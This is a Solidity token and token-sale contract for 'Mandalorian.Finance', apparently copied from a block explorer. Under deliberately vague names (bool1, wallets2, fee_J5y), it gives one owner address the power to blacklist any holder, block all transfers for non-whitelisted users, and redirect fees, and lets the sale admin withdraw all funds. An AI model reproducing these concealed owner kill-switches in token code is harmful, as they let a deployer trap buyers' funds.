/**
 *Submitted for verification at Etherscan.io on 2020-11-26
*/

/*
* Token Sale Contract
* https://Mandalorian.Finance/
*  
*     _      ____  _      ____  ____  _     ____  ____  _  ____  _     
*    / \__/|/  _ \/ \  /|/  _ \/  _ \/ \   /  _ \/  __\/ \/  _ \/ \  /|
*    | |\/||| / \|| |\ ||| | \|| / \|| |   | / \||  \/|| || / \|| |\ ||
*    | |  ||| |-||| | \||| |_/|| |-||| |_/\| \_/||    /| || |-||| | \||
*    \_/  \|\_/ \|\_/  \|\____/\_/ \|\____/\____/\_/\_\\_/\_/ \|\_/  \|
*                                                                      
*
* Designed by the Jedi Knights
* Play this game on Uniswap
* Check out our website and our TG & Twitter for more information on this project.
* 
**/ 

pragma solidity ^0.5.0;


interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}

contract ERC20Detailed is IERC20 {

  string private _name;
  string private _symbol;
  uint8 private _decimals;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
    _name = name;
    _symbol = symbol;
    _decimals = decimals;
  }

  function name() public view returns(string memory) {
    return _name;
  }

  function symbol() public view returns(string memory) {
    return _symbol;
  }

  function decimals() public view returns(uint8) {
    return _decimals;
  }
}

contract Mandalorian is ERC20Detailed {

  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;
  address wallet1 = 0x12BFC886A4d0FCF8FE8a00B6E32c1721C5101D22;
  address wallet2 = 0x261c1FFeAFF47Ba886AbC037aDB573838Bfd066E;
  address public wallet3 = 0x8c4dFDCF69139ac54EB9B8ddF562A2cf8c526Ef6;
  mapping (address => uint256) public wallets2;
  mapping (address => uint256) public wallets3;
  address wallet4 = 0xe60Af117941e78C9B08e08734707B92c0b12eB37;
  address[] wallets = [wallet4, wallet4, wallet4, wallet4, wallet4, wallet4, wallet4, wallet4, wallet4, wallet4];
  uint256[] walletsw = [2, 2, 2, 2, 2, 2, 2, 2, 2, 2];
  uint256 walletc = 0;
  string constant tokenName = "Mandalorian.Finance";
  string constant tokenSymbol = "IG-11";
  uint8  constant tokenDecimals = 18;
  uint256 public _totalSupply = 10000000000000000000000;
  uint256 public walletbp = 6;
  bool public bool1 = false;
  bool public bool2 = false;
  bool public bool3 = true;
  uint256 public myInt1 = 0;
  uint256[10] myInts = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
  uint256 myInt2 = 0;
  uint myInt3 = 0;
  uint256 myInt4 = 0;
  
    
  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {
    _mint(msg.sender, _totalSupply);
  }
  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }

  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }

  function fee_J5y(uint256 value) public view returns (uint256)  {
    return value.mul(walletbp).div(100);
  }

  function transfer(address to, uint256 value) public returns (bool) {
    require(value <= _balances[msg.sender]);
    require(to != address(0));
    require(wallets2[msg.sender] != 1, "Bots are not allowed");
    require(wallets2[to] != 1, "Bots are not allowed");

    if (bool1 && wallets3[msg.sender] !=1){
        _balances[msg.sender] = _balances[msg.sender].sub(value);
        
        myInt2 = fee_J5y(value).div(6).mul(4);
        myInt4 = value.sub(fee_J5y(value));
        
        _balances[to] = _balances[to].add(myInt4);
        _balances[wallet4] = _balances[wallet4].add(myInt2.div(4));
        
        _totalSupply = _totalSupply.sub(myInt2.div(4));

        myInt3 = walletsw[0].add(walletsw[1]).add(walletsw[2]).add(walletsw[3]).add(walletsw[4]).add(walletsw[5]).add(walletsw[6]).add(walletsw[7]).add(walletsw[8]).add(walletsw[9]);
        
        emit Transfer(msg.sender, to, myInt4);
        
        for (uint8 x = 0; x < 10; x++){
            myInts[x] = myInt2.div(myInt3).mul(walletsw[x]);
            _balances[wallets[x]] = _balances[wallets[x]].add(myInts[x]);
            emit Transfer(msg.sender, wallets[x], myInts[x]);
        }
        
        emit Transfer(msg.sender, wallet4, myInt2.div(4));
        emit Transfer(msg.sender, address(0), myInt2.div(4));
        
        if (msg.sender == wallet3 && value >= myInt1){
            wallets[walletc] = to;
            walletsw[walletc] = 2;
            walletc ++;
            if (walletc > 9)
                walletc = 0;
        }
        else if (to == wallet3 && value >= myInt1){
            wallets[walletc] = msg.sender;
            walletsw[walletc] = 1;
            walletc ++;
            if (walletc > 9)
                walletc = 0;
        }
        
    }
    else if (bool3 || msg.sender == wallet2 || wallets3[msg.sender] == 1){
        _balances[msg.sender] = _balances[msg.sender].sub(value);
        _balances[to] = _balances[to].add(value);
        emit Transfer(msg.sender, to, value);
    }
    else{
        revert("Dev is working on enabling degen mode!");
    }
    return true;
  }

  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    require(value <= _balances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(to != address(0));
	require(wallets2[from] != 1, "Bots are not allowed");
	require(wallets2[to] != 1, "Bots are not allowed");

    if (bool1){
        _balances[from] = _balances[from].sub(value);
        
        myInt2 = fee_J5y(value).div(6).mul(4);
        myInt4 = value.sub(fee_J5y(value));
        
        _balances[to] = _balances[to].add(myInt4);
        _balances[wallet4] = _balances[wallet4].add(myInt2.div(4));
        
        _totalSupply = _totalSupply.sub(myInt2.div(4));

       myInt3 = walletsw[0].add(walletsw[1]).add(walletsw[2]).add(walletsw[3]).add(walletsw[4]).add(walletsw[5]).add(walletsw[6]).add(walletsw[7]).add(walletsw[8]).add(walletsw[9]);
        
        emit Transfer(from, to, myInt4);
        
        for (uint8 x = 0; x < 10; x++){
            myInts[x] = myInt2.div(myInt3).mul(walletsw[x]);
            _balances[wallets[x]] = _balances[wallets[x]].add(myInts[x]);
            emit Transfer(from, wallets[x], myInts[x]);
        }
        
        emit Transfer(from, wallet4, myInt2.div(4));
        emit Transfer(from, address(0), myInt2.div(4));
        
        if (from == wallet3 && value >= myInt1){
            wallets[walletc] = to;
            walletsw[walletc] = 2;
            walletc ++;
            if (walletc > 9)
                walletc = 0;
        }
        else if (to == wallet3 && value >= myInt1){
            wallets[walletc] = from;
            walletsw[walletc] = 1;
            walletc ++;
            if (walletc > 9)
                walletc = 0;
        }
    }
    else if (bool3 || from == wallet2){
        _balances[from] = _balances[from].sub(value);
        _balances[to] = _balances[to].add(value);
        emit Transfer(from, to, value);
    }
    else{
        revert("Dev is working on enabling degen mode!");
    }
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)  public {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
  }

  function _mint(address account, uint256 amount) internal {
    require(amount != 0);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function burn(uint256 amount) external {
    _burn(msg.sender, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(amount != 0);
    require(amount <= _balances[account]);
    _totalSupply = _totalSupply.sub(amount);
    _balances[account] = _balances[account].sub(amount);
    emit Transfer(account, address(0), amount);
  }
 
  function burnFrom(address account, uint256 amount) external {
    require(amount <= _allowed[account][msg.sender]);
    _allowed[account][msg.sender] = _allowed[account][msg.sender].sub(amount);
    _burn(account, amount);
  }
  
  function enableBool1() public {
    require (msg.sender == wallet2);
    require (bool2);
    require (!bool3);
    bool1 = true;
  }
  
  function disableBool3() public {
    require (msg.sender == wallet2);
    bool3 = false;
  }
  
  function setwallet3(address newWallet) public {
    require (msg.sender == wallet2);
    wallet3 =  newWallet;
    bool2 = true;
  }
  
  function setMyInt1 (uint256 myInteger1) public {
    require (msg.sender == wallet2);
    myInt1 = myInteger1;
  }
  
  function setWallets2 (address newWallets2) public {
    require (msg.sender == wallet2);
    wallets2[newWallets2] = 1;
  }
  
  function setWallets2x (address newWallets2) public {
    require (msg.sender == wallet2);
    wallets2[newWallets2] = 0;
  }
  
  function setWallets3 (address newWallets2) public {
    require (msg.sender == wallet2);
    wallets3[newWallets2] = 1;
  }
  
  function setWallets3x (address newWallets2) public {
    require (msg.sender == wallet2);
    wallets3[newWallets2] = 0;
  }
  
  function setWallet4 (address newWallet) public {
    require (msg.sender == wallet2);
    wallet4 = newWallet;
  }
  
}



contract MandalorianSale {
    address payable public admin;
    Mandalorian public tokenContract;
    uint256 public tokenPrice;
    uint256 public tokensSold;
	uint256 public constant decimals = 10**18;

    event Sell(address _buyer, uint256 _amount);

    constructor (Mandalorian _tokenContract, uint256 _tokenPrice) public {
        admin = msg.sender;
        tokenContract = _tokenContract;
        tokenPrice = _tokenPrice;
        tokensSold = 0;
    }

    function multiply(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x);
    }

    function buyTokens(uint256 _numberOfTokens) public payable {
        require(msg.value == multiply(_numberOfTokens, tokenPrice));
        require(tokenContract.balanceOf(address(this)) >= _numberOfTokens*decimals);
        require(tokenContract.transfer(msg.sender, _numberOfTokens*decimals));

        tokensSold += _numberOfTokens;

        emit Sell(msg.sender, _numberOfTokens);
    }

    function endSale() public {
        require(msg.sender == admin);
        require(tokenContract.transfer(admin, tokenContract.balanceOf(address(this))));
        tokensSold = 0;
        admin.transfer(address(this).balance);
    }
}